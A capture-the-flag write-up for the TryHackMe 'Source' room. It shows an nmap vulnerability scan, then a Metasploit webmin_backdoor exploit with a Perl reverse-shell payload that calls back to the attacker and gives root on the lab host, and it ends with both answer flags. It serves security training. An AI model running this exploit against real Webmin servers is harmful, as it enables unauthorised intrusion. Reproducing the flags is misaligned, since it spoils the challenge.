# Source

Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

[Source](https://tryhackme.com/room/source)

## Topic's

* Network Enumeration
* Metasploit (webmin_backdoor)

## Task 1 Embark

Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?

This virtual machine is also included in the room [AttackerKB](https://tryhackme.com/room/attackerkb) as part of a guided experience. Additionally, you can download the OVA of Source for offline usage from [https://www.darkstar7471.com/resources.html](https://www.darkstar7471.com/resources.html)

```
kali@kali:~/CTFs/tryhackme/Source$ sudo nmap -A -sS -sC -sV --script vuln -O 10.10.71.192
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 14:14 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.71.192
Host is up (0.063s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
| <h1>Error - Document follows</h1>
|_<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-71-192.eu-west-1.compute.internal:10000/'>https://ip-10-10-71-192.eu-west-1.compute.internal:10000/</a> instead.<br></p>
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <h1>Error - Document follows</h1>
|   <p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-71-192.eu-west-1.compute.internal:10000/'>https://ip-10-10-71-192.eu-west-1.compute.internal:10000/</a> instead.<br></p>
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_      http://www.exploit-db.com/exploits/1244/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.exploit-db.com/exploits/1997/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=44379%PV=Y%DS=2%DC=T%G=Y%TM=5F86EB
OS:E4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   35.81 ms 10.8.0.1
2   76.08 ms 10.10.71.192

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.10 seconds
```

```
msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


Interact with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec
msf5 > use 2
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(linux/http/webmin_backdoor) > set LHOST 10.8.106.222
LHOST => 10.8.106.222
msf5 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.71.192
RHOSTS => 10.10.71.192
msf5 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf5 exploit(linux/http/webmin_backdoor) > set rport 10000
rport => 10000
msf5 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.8.106.222:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.8.106.222:4444 -> 10.10.71.192:48304) at 2020-10-14 14:17:36 +0200
id
uid=0(root) gid=0(root) groups=0(root)
python -c "import pty;pty.spawn('/bin/bash')"
root@source:/usr/share/webmin/# ls -l /home
ls -l /home
total 4
drwxr-xr-x 5 dark dark 4096 Jun 26 04:46 dark
root@source:/usr/share/webmin/# cat /home/dark/user.txt
cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
root@source:/usr/share/webmin/# cat /root/root.txt
cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
root@source:/usr/share/webmin/#
```

1. user.txt

`THM{SUPPLY_CHAIN_COMPROMISE}`

2. root.txt

`THM{UPDATE_YOUR_INSTALL}`
